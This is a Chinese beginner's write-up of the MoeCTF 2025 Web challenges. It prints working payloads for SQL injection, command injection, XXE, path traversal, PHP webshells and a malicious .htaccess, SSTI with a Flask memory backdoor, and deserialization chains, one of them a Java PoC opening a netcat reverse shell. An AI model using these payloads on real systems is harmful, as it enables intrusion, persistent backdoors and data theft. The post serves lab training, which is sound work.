---
title: "moectf2025 Web 题解汇总"
description: "MoeCTF 2025 Web方向比赛WP，整理解题思路、关键利用点和赛后复盘记录。"
pubDate: "2025-11-01"
updatedDate: "2025-11-01"
tags: ["CTF", "Web安全", "WP"]
cover: auto
coverAlt: "moectf2025 Web 题解汇总 的文章封面"
draft: false
---
## Web入门指北

这是一篇纯新手向的文章，用来介绍我从一个零基础新手到可以初步解题的全过程。写这篇《Web入门指北》的目的是希望可以让和我一样，原本对计算机一窍不通的人也能入门网络安全这个方向。

接下来我将通过 **moectf2025** 中的 Web 向试题来引入，主要从**如何开始**、**如何搜集信息**、**如何利用 AI 工具**这几个方面来开启这篇文章。

> **注：** 关于平台的注册与连接方面的内容需要自己尝试一下，题目连接详见西电平台知识中的题目连接指南。这是最初的一步，切忌畏难和怕麻烦心理，进步要在前进的每一小步中慢慢体现。

### 1. 如何开始

现在 `moectf2025` 已经告一段落，在“训练”的赛事一栏中便可以找到。随后我们来到“Web安全与渗透测试”，点击“0 web入门指北”，你将会在里面看到附件和题目信息。

附件中有一个专业的入门指北，你们也可以初步审阅。不过可能内容对纯新人来讲会很晦涩，可以跟着我，有一定的经验后再去阅读，相信你会有一些新的收获。

首先打开其中一个题目附件后，你会看到一堆括号，同时给了一个提示：“你知道什么是控制台吗？快去了解一下吧！”

![题目附件中显示的括号代码](/images/posts/console.png)

看到这里我们肯定会想要去浏览器上搜索一下“控制台”是什么，但是直接搜索的结果可能会让人眼前一黑，有种摸不着头脑的感觉。

这个时候就要引入我想讲的后两个内容：**如何搜集信息**和**如何利用AI**。

### 2. 如何搜集信息

使用搜索引擎有一定的技巧。首先，如果可以，尽量不要只使用百度的搜索，其广告覆盖和信息混乱的情况比较严重，可以尝试使用 **Google** 或是 **Bing (必应)**。

其次，在搜索时要使用更精确的关键词。单独的“控制台”涵盖的范围太大，我们可以加上一些限定词，比如说 `CTF 控制台`，这样便可以较好地锁定到相关信息。

相信通过搜索你已经获得了信息：**控制台**指的是浏览器“开发者工具”（按 `F12` 打开）中的其中一个面板，可以用来运行 JavaScript 代码。这道题中一大串的括号类字符是 **JSFuck**，一种仅通过 `()` `[]` `{}` `!` `+` 来编写 JavaScript 代码的技术。

所以这道题有两个解法：

*   **解法一：** 将附件中的 JSFuck 代码复制下来，找一个专门的在线反混淆网站来解密。
*   **解法二：** 将 JSFuck 代码直接扔到浏览器的**控制台**中运行（在某些浏览器中，可能需要先在控制台中输入 `allow pasting` 并回车）。

运行结果如图：

![在控制台中运行JSFuck代码后的结果](/images/posts/result.png)

### 3. 如何利用AI搜索

在这个 AI 大受欢迎的年代，使用 AI 的能力不可或缺。**DeepSeek**, **ChatGPT**, **Gemini**, **Claude** 等都是相当好用的工具。

这道题同样可以使用 AI 求解。你可以设置一个情景来询问 AI，例如：

> “我正在做一道 CTF 试题，题目提示是‘控制台’，附件中给了一长串只有括号、方括号和加号的代码（对于其他试题按 `Ctrl+U` 可以看到网页源码）。请问这可能是什么？请给出详细的解题思路与步骤。”

跟着 AI 的引导相信你也可以完成这道试题。但是请记住：
1.  AI 可以**辅助**解题，但一般不可能直接给出题目的 Flag。
2.  要对 AI 生成的内容带有**批判精神**，警惕“AI幻觉”（一本正经地胡说八道）。

### 总结

总体上，这是一篇针对一场比赛的入门指北，但其中涉及的对搜索引擎和 AI 的使用能力是具有普遍性的。务必牢记：借助工具解出的题目，只有在**消化吸收**知识后才能真正变为自己的。在比赛期间可以学得有些囫囵吞枣，但是赛后复盘一定要有思考的深度。感谢你的阅读。

---

## 第一章：前端绕过

首先连好环境，然后复制网址，开始做题。网页如图：

![题目网页截图](/images/posts/网页.png)

我们尝试将附件内容复制过来，发现禁止粘贴。依旧按 `F12` 打开开发者工具，查看 `shouzhuo.js` 中的前端代码，发现 Flag 就在其中。

![在JS源码中找到Flag](/images/posts/success.png)

通过阅读前端代码，我们发现其实这道题可以有其他解法。前端代码中禁用了粘贴，我们只需要在控制台输入以下命令将粘贴功能重新开放即可：

```javascript
document.addEventListener('paste', e => e.stopPropagation(), true);
```
这段 JavaScript 代码通过提前捕获粘贴事件，阻止其被禁用，从而恢复粘贴功能。然后我们就可以复制内容并提交了。

![使用控制台命令后成功提交](/images/posts/success2.png)

---

## 第二章：HTTP抓包初识

题目提示HTTP抓包。我们可以使用 **Burp Suite** 或者是 **Yakit** 等工具（推荐Yakit，界面比较美观）。在网上搜索相应的资源与使用教学便可开始使用。

打开网页，有一段文字被涂抹了，但可以复制。复制下来发现一个路由地址，我们通过抓包来访问这个地址。

![抓包结果显示Flag](/images/posts/result.png)

抓包后发现 Flag 在请求头（Request Header）里。我们也可以直接访问该路由，然后按 `F12` 在“网络(Network)”面板中查找到对应的请求，查看其请求头信息。

---

## 第三章：修改HTTP请求

这道题依然是考察HTTP请求包。我们需要对URL和POST传参的内容进行修改，即可得到 Flag。

![修改请求后得到Flag](/images/posts/result.png)

---

## 第四章：HTTP请求的多种姿势

这道题分多关考察了不同的HTTP请求知识。

#### **第一关：GET传参**
一个简单的GET传参，在URL后面加上 `?key=xdsec` 即可。

![GET传参成功](/images/posts/get.png)

#### **第二关：POST传参**
一个简单的POST传参，构造如下请求：
```http
POST /cloud_weaver HTTP/1.1
Host: 127.0.0.1:28326
Content-Type: application/x-www-form-urlencoded

declaration=织云阁=第一
```

#### **第三关：伪造IP**
题目要求本地访问，需要用到 `X-Forwarded-For: 127.0.0.1`，将该内容加进请求头中。`X-Forwarded-For` 是一个HTTP扩展头部，用于表示客户端的真实IP，`127.0.0.1` 可以用于伪造本地请求。

#### **第四关：伪造User-Agent**
题目要求伪造 `User-Agent`，在请求头中加入 `User-Agent: moe browser`。`User-Agent` 用于表示用户的操作系统、浏览器版本等信息，在爬虫中经常需要伪造它来模拟浏览器访问。

#### **第五关：Cookie验证**
题目要求验证身份，在请求头中加入 `Cookie: user=xt`。Cookie是保存在本地的小型文本文件，用于记录和缓存用户身份数据。

#### **第六关：Referer验证**
题目要求来源为 `http://panshi/entry`，在请求头中加入 `Referer: http://panshi/entry`。Referer头部表示当前请求的来源页面。

#### **第七关：PUT请求**
题目要求使用 `PUT` 方法发送请求，将请求方法从 `GET`/`POST` 改为 `PUT` 即可。

---

## 第五章：路径遍历

这是一个简单的本地文件包含（LFI）和路径遍历漏洞。输入 `../../../../flag` 来访问 `flag` 文件，或者是 `../../../proc/self/environ` 查看环境变量。

> **原理简介**：路径遍历的原理是通过 `../` 跳到上一级目录，来访问Web目录之外的、原本不能访问的文件。如果服务器对用户传入的参数缺乏验证，就可能通过此方法访问到服务器上的敏感文件。

---

## 第六章：SQL注入之万能密码

一个简单的SQL注入万能密码，在用户名输入框中输入 `admin' or 1=1#` 即可成功获得 Flag。

> **原理简介**：SQL注入的原理是，Web应用未对用户输入进行充分过滤，导致恶意的SQL代码被拼接到正常的查询语句中并被数据库执行。
>
> 正常的查询语句为：
> ```sql
> SELECT * FROM users WHERE username = 'user1' AND password = 'password1';
> ```
> 当我们输入 `admin' --` 时，查询语句变为：
> ```sql
> SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...';
> ```
> `--`（或 `#`）在SQL中是注释符，会把后面的密码验证部分注释掉。
>
> 当我们输入 `admin' OR '1'='1` 时，查询语句变为：
> ```sql
> SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
> ```
> 由于 `'1'='1'` 恒为真，且在MySQL中 `AND` 的优先级高于 `OR`，这条语句也会绕过验证。

---

## 第七章：MD5比较绕过

通过阅读提示，我们访问了 `robots.txt` 文件，该文件是一种协议，规定了搜索引擎可以访问网站上的哪些内容。在 `robots.txt` 中我们发现了 `flag.php` 可以访问。

审计 `flag.php` 的代码，发现是一个简单的MD5弱比较（`==`）。PHP在处理 `0e` 开头的哈希值时，会将其视为科学计数法，结果都为0，因此可以轻易绕过。

下面附几个常用的 `0e` 开头的值：
`?a=QNKCDZO&b=240610708`
*   `QNKCDZO`: `0e830400451993494058024219903391`
*   `240610708`: `0e462097431906509019562988736854`

### 扩展知识

1.  **强比较（`===`）绕过**
    如果代码是 `md5($a) === md5($b)`，我们可以传入数组绕过，例如 `a[]=1&b[]=2`，因为 `md5()` 函数处理数组时会返回 `null`，最终比较 `null === null` 为真。

2.  **MD5强碰撞**
    如果代码强制转换了类型 `(string)$a != (string)$b` 且使用强比较，就需要用到MD5强碰撞，即找到两个不同的字符串，它们的MD5哈希值完全相同。

---

## 第八章：联合注入

题目提示为联合注入（UNION Injection）。`UNION` 是MySQL中的一个操作符，可以合并两个及以上的 `SELECT` 语句的结果集。我们可以利用它来查询数据库中的额外信息。

以下是解题步骤：

1.  **判断列数:**
    `' union select 1,2#`
    发现页面显示 "welcome 1"，说明查询结果有2列，并且第1列的内容会显示在页面上。

2.  **爆数据库名:**
    `' union select database(),2#`
    页面返回数据库名为 `user`。

3.  **爆表名:**
    `' union select group_concat(table_name),2 from information_schema.tables where table_schema=database()#`
    页面返回表名 `flag,user`。

4.  **爆列名:**
    `' union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#`
    页面返回 `flag` 表中的列名为 `value`。

5.  **查询数据:**
    `' union select value,2 from flag#`
    得到 Flag。

---

## 第九章：命令执行 (ping)

这道题是一个命令注入漏洞。利用了 `;` 作为命令分隔符，可以在执行完 `ping` 命令后，再执行一个我们自己注入的命令来泄露信息。

**Payload**: `www.baidu.com;env`

`env` 命令会列出所有环境变量，Flag就在其中。

---

## 第十章：XXE

随便输入内容后，返回结果的格式为XML文件，因此考虑存在XXE（XML External Entity）漏洞。

![XXE题目网页截图](/images/posts/网页.png)

> **原理简介**：XXE漏洞原理是XML解析器在解析外部实体时，没有禁止外部实体的引用，导致攻击者可以引用外部文件或URL，造成文件读取、命令执行或内网探测等危害。

**Payload** 如下：
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=flag.txt">]>
<输出>&file;</输出>
```
**Payload解释:**
*   `<!DOCTYPE root [...]>`: 声明一个文档类型定义（DTD）。
*   `<!ENTITY file SYSTEM "...">`: 定义一个名为 `file` 的外部实体，其内容来自系统文件。
*   `php://filter/.../resource=flag.txt`: 使用PHP的 `filter` 伪协议读取 `flag.txt` 文件，并将其内容进行Base64编码。
*   `&file;`: 在XML文档中引用实体 `file`，解析器会将其替换为 `flag.txt` 经过Base64编码后的内容，并返回给我们。

---

## 第十章re：XXE（绝对路径）

该题思路同第十章，也是一个简单的XXE漏洞。payload相比原题仅在文件名 `flag.txt` 前多了一个 `/`。

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">]>
<输出>&file;</输出>
```
*   `flag.txt`: 表示**相对路径**，访问的是当前工作目录下的文件。
*   `/flag.txt`: 表示**绝对路径**，寻找位于系统根目录下的 `flag.txt` 文件。

---

## 第十一章：参数爆破与PHP伪协议

根据题目提示需要进行传参，但参数涉及 `m, n, o, p, q` 五个字母的120种全排列。我们可以写一个Python脚本来生成所有可能的参数组合。

**Python脚本:**
```python
import itertools

letters = ['m', 'n', 'o', 'p', 'q']
perms = [''.join(p) for p in itertools.permutations(letters)]
query_string = '&'.join(f"{s}={s}" for s in perms)
print(query_string)
```
将脚本生成的长字符串作为GET参数附加到URL后面。

成功传参后出现一个文件查询功能，但是对输出的字符数进行了限制。观察URL，发现是本地文件包含漏洞，我们可以使用PHP封装流（wrapper）将 `flag.php` 的源码以Base64的形式读出，绕过字数限制。

**Payload:**
`php://filter/read=convert.base64-encode/resource=flag.php`

#### **PHP伪协议扩展:**
*   `php://filter`: 元封装器，用于在读取或写入数据流时对其进行筛选过滤。
*   `data://`: 数据流封装器。当与文件包含函数结合时，可以执行用户传入的PHP代码，如 `data://text/plain,<?php phpinfo();?>`。
*   `file://`: 用于访问本地文件系统，如 `file:///etc/passwd`。

---

## 第十二章：蚁剑的使用

这道题主要学习蚁剑（AntSword）的使用。首先我们需要下载蚁剑，具体操作可以学习网上专门的博客教程。

打开蚁剑，添加Shell地址并连接。简单浏览文件系统没有看到 Flag，我们右键打开虚拟终端，输入命令 `env` 打印环境变量，即可获得 Flag。

---

## 第十三章：文件上传

这道题考察文件上传漏洞。我们需要制作一个**图片马**，即一个看似是图片文件、但内部包含PHP代码的文件。

可以使用以下PowerShell脚本来生成：
```powershell
# 创建JPEG文件头
[byte[]]$bytes = 0xFF, 0xD8, 0xFF
Set-Content -Path exploit.jpg -Value $bytes -Encoding Byte -NoNewline

# 添加一句话木马
Add-Content -Path exploit.jpg -Value '<?php @eval($_REQUEST["cmd"]); ?>' -NoNewline
```
在PowerShell中运行上述命令，会生成一个 `exploit.jpg` 文件。

然后，使用Yakit或BurpSuite拦截上传请求，将文件名从 `exploit.jpg` 修改为 `exploit.php`（或其他允许的后缀，如 `.phtml` 等）来绕过前端验证。

上传成功后，使用蚁剑连接这个PHP马的URL，在终端中执行 `printenv` 或 `env` 命令获得 Flag。

#### **其他解法**
如果将一句话木马中的 `eval` 改成 `system`，如 `<?=system($_GET["cmd"]);?>`，那么上传成功后，我们可以直接访问该文件的URL，并通过GET参数执行命令，例如：
*   `http://<target>/uploads/exploit.php?cmd=ls /`
*   `http://<target>/uploads/exploit.php?cmd=cat /flag`


---

## 第十四章 ：文件上传

这道题提示是apache中一个配置文件，也就是htaccess文件，我们需要上传一个恶意的htaccess文件，来执行命令。

自己写一个.htaccess文件，内容如下：
```
<Files .htaccess>
    SetHandler application/x-httpd-php
    Require all granted
</Files>

#<?php system($_REQUEST["cmd"]);
```

这里利用了自解析，把自己变成了php文件

该题还可以传两次文件来写，大家可以试一下

这里#的原理是因为，#号在.htaccess中可以注释掉php代码，但是在php代码中没有影响

Require all granted用于确保可以访问该文件

---

## 第十五章 条件竞争

这里不需要弯弯绕绕，直接传php文件即可，然后去访问，这题有两个方法

解1：

利用burp suite进行一边上传，一边访问的爆破，你只需要知道上传后文件上传到了哪里即可，上传和访问可以有点小巧思，把一个不重要的参数当成

爆破点即可。

解2：

用一个bash脚本来爆破，一个比较简单的脚本，但是成功率有点低

```
#!/bin/bash
q(){
curl -fs -X POST \
-H "Content-Type: multipart/form-data"\
-F "upload_file=@cmd.php" \
-F "submit=上传"\
http://127.0.0.1:23208/upload.php
}
p(){
curl -fs http://127.0.0.1:23208/uploads/cmd.php
}
ab() {
while true; do
q &
sleep 0.05
done
}

cd(){
while true; do
p &
sleep 0.02
done
}

ab & cd
wait
```

传的文件内容分别是

```
<?php system('ls -la /'); ?>
```

```
<?php system('cat /flag.txt'); ?>
```

---

## 第十六章 

审一下题目，主要需要把.php挤掉，这里使用data伪协议

```
data://text/plain,<?php system('cat /flag*');?>
```

这里data伪协议把后面的内容当作php文件执行

---

## 第十七章 php反序列化

一个简单的php反序列化，用到了魔术方法__destruct()该方法在对象被销毁时调用

```
<?php
class A{
    public $a;
}
$b = new A;
$b->a = "system('env');";
echo urlencode(serialize($b));
?>
```

## 第十八章 php反序列化

依旧是一个简单的php反序列化，因为PersonA中的name为私密所以构造一个__construct方法来赋值，然后将b传进去，调用b的work
```
<?php
class PersonA{
    private $name;
    public function __construct($name){
        $this->name = $name;
    }
}
class PersonB{
    public $name;
}
$b=new PersonB;
$b->name = "system('env');";
$a = new PersonA($b);
echo urlencode(serialize($a));
?>
```

## 第十九章

这里有一点复杂，首先要绕一下__wakeup方法，所以c的id得是一个对象，然后又用到了一个$name($this); 所以我们得要确保id中的对象可以被当成函数调用，所以我们用Person来当作这个

对象，所以后面一步我们可以往这个Person对象中传入一个PersonB对象，来防止报错。


然后我们下一步就可以开始利用了，我们首先利用PersonA，往id中传入一个__check来调用C中的__check方法，name中传一个C对象，然后age中传入系统命令，再构造一个C对象，往id中传

入我们之前构造的Person对象，name为"system"，age为随意一个值，得解
```
<?php 
class Person{
    public $name;
    public $id;
    public $age;
}
class PersonA extends Person {}
class PersonB extends Person {}
class PersonC extends Person {}
$b = new PersonB;
$helper = new Person;
$helper->id = $b;
$c = new PersonC;
$c->name = "system";
$c->id = $helper;
$c->age = "1";
$a = new PersonA;
$a->name = $c;
$a->id = "__check";
$a->age = "cat /flag";
echo urlencode(serialize($a));
?>
```

## 第十九章re

这里的解法和第十九章差不多，只是把PersonC中的name改成了"System"绕过对小写system的检查，然后把PersonA中的name改成了"check"，这样就能触发check方法了，不过这里把invoke放到B中了，需要两个B对象。

```
<?php 
class Person{
    public $name;
    public $id;
    public $age;
}
class PersonA extends Person {}
class PersonB extends Person {}
class PersonC extends Person {}
$b1 = new PersonB;
$b = new PersonB;
$b->id = $b;
$c = new PersonC;
$c->name = "System";
$c->id = $b;
$c->age = "1";
$a = new PersonA;
$a->name = $c;
$a->id = "check";
$a->age = "env";
echo urlencode(serialize($a));
?>
```

## 第二十章 

一个常规的SSTI，可以fenjing一把梭，可以试一下，或者自己慢慢按照常规流程写一下

## 第二十一章 

利用一下lipsum全局变量，再绕一下黑名单

```
{% print(lipsum['\x5f\x5fglo'+'bals\x5f\x5f']['os'].popen('env').read())%}
```


## 第二十二章 

这是一个SSTI无回显，可以内存马或者写静态目录，这里使用内存马

```
{{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
```

然后得要suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

这里利用cat /usr/bin/rev.c拿出源码，然后

```
/usr/bin/rev --HDdss cat /flag
```

## webshell

这里是一个简单的无字母数字webshell，可以通过取反，自增，异或等方法来构造命令，我使用取反

```
$_=~%8F%97%8F%96%91%99%90;$_();
```

## webshell revenge

这里是加强版，不让用变量符号，可以看一看离别歌师傅的博客有详细的教程，搜无字母数字webshell

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <form action="http://127.0.0.1/????" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" name="submit">
  </form>
</body>
</html>
```

写一个文件上传，然后抓获流量包

```
POST /?shell=?><?=`.+/???/????????[@-[]`;?> HTTP/1.1
Host: 127.0.0.1:52102
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Dest: document
Origin: null
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Sec-Fetch-Site: cross-site
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIAub1mNTfRLYoJNp
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-User: ?1
sec-ch-ua-platform: "Windows"
Cache-Control: max-age=0
sec-ch-ua-mobile: ?0
sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"
Sec-Fetch-Mode: navigate
Content-Length: 311

------WebKitFormBoundaryIAub1mNTfRLYoJNp
Content-Disposition: form-data; name="file"; filename="code"
Content-Type: application/octet-stream

#!/bin/bash 
env
------WebKitFormBoundaryIAub1mNTfRLYoJNp
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundaryIAub1mNTfRLYoJNp--
```

## 第二十三章 java反序列化

审一下题目，在源码中我们可以看到wagtail链

```
 public Object chainWagTail() {
    Object input = null;
    for (Dog dog : this.dogs.values()) {
      if (input == null)
        input = dog.object; 
      Object result = dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);
      input = result;
    } 
    return input;
  }
```

这一步是重点会将上一个result作为下一个的input传递，同时dog.class中重写了hashcode调用了wagtail方法

```
  default Object wagTail(Object input, String methodName, Class[] paramTypes, Object[] args) {
    try {
      Class<?> cls = input.getClass();
      Method method = cls.getMethod(methodName, paramTypes);
      return method.invoke(input, args);
    } catch (Exception e) {
      e.printStackTrace();
      return null;
    } 
  }
```

wagtail中有invoke，所以全链形成，我们可以建立一个dog的linkedhashmap，创建四个dog，然后将四个dog塞进这个dogmap里面，然后将这个作为key放到一个新建的hashmap中，因为hashmap会自动解析key从

而实现全链，以下是ai生成的一个比较清晰的POC

```
package com.example.demo;

import com.example.demo.Dog.Dog;
import com.example.demo.Dog.DogService;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.*;

public class PoC {
    public static void main(String[] args) throws Exception {
        // ==========================================
        // 1. 设置攻击命令 (Netcat 反弹 Shell)
        // ==========================================
        // 如果 rev-shell 无法解析，请改为你的宿主机 IP (如 192.168.x.x)
        String[] cmd = new String[]{"nc", "127.0.0.1", "5000", "-e", "/bin/sh"};

        // ==========================================
        // 2. 构造反射链 (4步走)
        // ==========================================
        
        // Dog 0: 获取 Runtime 类 -> Class.forName("java.lang.Runtime")
        Dog dog0 = makeDog(Class.class, "forName", 
                new Class[]{String.class}, new Object[]{"java.lang.Runtime"});
        
        // Dog 1: 获取 getRuntime 方法 -> Runtime.class.getMethod("getRuntime", null)
        Dog dog1 = makeDog(null, "getMethod",
                new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null});
        
        // Dog 2: 调用 getRuntime 获取实例 -> method.invoke(null, null)
        Dog dog2 = makeDog(null, "invoke", 
                new Class[]{Object.class, Object[].class}, new Object[]{null, null});
        
        // Dog 3: 执行命令 -> runtime.exec(String[] cmd)
        // 注意：这里使用 String[].class 作为参数类型，防止空格截断问题
        Dog dog3 = makeDog(null, "exec", 
                new Class[]{String[].class}, new Object[]{cmd});

        // ==========================================
        // 3. 装载进容器 (使用 LinkedHashMap 保证顺序)
        // ==========================================
        Map<Integer, Dog> dogsMap = new LinkedHashMap<>();
        dogsMap.put(0, dog0);
        dogsMap.put(1, dog1);
        dogsMap.put(2, dog2);
        dogsMap.put(3, dog3);

        DogService dogService = new DogService();
        setField(dogService, "dogs", dogsMap);

        // ==========================================
        // 4. 构造触发器 (Trigger)
        // ==========================================
        // 这里的 object 设为 dogService，方法设为 chainWagTail
        Dog trigger = makeDog(dogService, "chainWagTail", new Class[]{}, new Object[]{});
        
        // 放入 HashSet (反序列化时会自动调用 trigger.hashCode)
        HashSet<Dog> dogSet = new HashSet<>();
        dogSet.add(trigger);

        // ==========================================
        // 5. 生成并输出 Base64
        // ==========================================
        String b64 = exportDogsBase64(dogSet);
        System.out.println("Payload 生成成功! 请复制下方字符串:");
        System.out.println(b64);
    }

    // 辅助方法：反射设置私有字段
    static void setField(Object d, String name, Object value) {
        try {
            // 先尝试从当前类获取
            Field f = d.getClass().getDeclaredField(name);
            f.setAccessible(true);
            f.set(d, value);
        } catch (Exception e) {
            // 如果失败，尝试从父类获取 (针对可能的继承结构)
            try {
                Field f = d.getClass().getSuperclass().getDeclaredField(name);
                f.setAccessible(true);
                f.set(d, value);
            } catch (Exception ex) {
                throw new RuntimeException(ex);
            }
        }
    }

    // 辅助方法：快速制造 Dog 对象
    static Dog makeDog(Object object, String methodName, Class[] paramTypes, Object[] args) throws Exception {
        int id = 114514; 
        Dog dog = new Dog(id, "exploit", "pwn", 1);
        setField(dog, "object", object);
        setField(dog, "methodName", methodName);
        setField(dog, "paramTypes", paramTypes);
        setField(dog, "args", args);
        return dog;
    }

    // 核心序列化方法
    static String exportDogsBase64(HashSet<Dog> dogs) {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            // 【重要】直接写入 HashSet，千万不要转成 ArrayList
            oos.writeObject(dogs); 
            oos.flush();
            return Base64.getEncoder().encodeToString(baos.toByteArray());
        } catch (IOException e) {
            e.printStackTrace();
            return "";
        }
    }
}
```





